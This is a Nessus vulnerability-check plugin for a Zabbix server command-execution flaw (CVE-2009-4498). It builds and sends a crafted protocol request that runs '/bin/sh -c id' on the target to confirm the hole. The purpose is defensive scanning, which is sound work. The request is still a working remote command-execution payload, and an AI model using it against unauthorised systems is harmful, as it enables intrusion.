#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(44620);
  script_version("$Revision: 1.9 $");
  script_cvs_date("$Date: 2016/05/04 18:02:24 $");

  script_cve_id("CVE-2009-4498");
  script_bugtraq_id(37989);
  script_osvdb_id(60965);
  script_xref(name:"Secunia", value:"37740");

  script_name(english:"Zabbix node_process_command() Function Crafted Request Arbitrary Command Execution");
  script_summary(english:"Attempts to execute the command 'id' on the server");

  script_set_attribute(attribute:"synopsis", value:"The remote service allows execution of arbitrary commands.");
  script_set_attribute(
    attribute:"description",
    value:
"The version of Zabbix server running on the remote host has a command
execution vulnerability in the 'process_node_command()' function of
'nodehistory.c'. 

A remote attacker could exploit this by sending a specially crafted
request, resulting in the execution of operating system commands."
  );
  script_set_attribute(attribute:"see_also", value:"https://support.zabbix.com/browse/ZBX-1030");
  script_set_attribute(attribute:"solution", value:"Upgrade to Zabbix 1.6.8 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploithub_sku", value:"EH-12-725");
  script_set_attribute(attribute:"exploit_framework_exploithub", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Zabbix Server Arbitrary Command Execution');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
  script_cwe_id(78);

  script_set_attribute(attribute:"vuln_publication_date", value:"2009/09/15");
  script_set_attribute(attribute:"patch_publication_date", value:"2009/12/13");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/02/15");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();

  script_category(ACT_GATHER_INFO);
  script_family(english:"Misc.");

  script_copyright(english:"This script is Copyright (C) 2010-2016 Tenable Network Security, Inc.");

  script_dependencies("zabbix_server_detect.nasl");
  script_require_ports("Services/zabbix_server", 10051);

  exit(0);
}


include("global_settings.inc");
include("byte_func.inc");
include("misc_func.inc");

port = get_kb_item("Services/zabbix_server");
if (!port) port = 10051;
if (!get_port_state(port)) exit(0, "Port "+port+" is not open.");

soc = open_sock_tcp(port);
if (!soc) exit(1, "Can't open a socket on port "+port+".");

set_byte_order(BYTE_ORDER_LITTLE_ENDIAN);

header = 'ZBXD'+mkbyte(1);
data = 'Command'+mkbyte(0255);
data += '0' + mkbyte(0255);
data += '0000' + mkbyte(0255);
data += '/bin/sh -c id' + mkbyte(0255);
size = mkdword(strlen(data)) + mkdword(0);

req = header+size+data;
send(socket:soc, data:req);

res = recv(socket:soc, length:256);

# should look something like this: uid=1001(zabbix) gid=1001(zabbix) groups=1001(zabbix)
if(strlen(res) && "uid=" >< res)
{
  if (report_verbosity > 0)
  {
    report = '\nThe output of "/bin/sh -c id" is :\n\n'+res+'\n';
    security_hole(port:port, extra:report);
  }
  else security_hole(port);
  exit(0);
}
else exit(0, 'The Zabbix server on port '+port+' is not affected.');
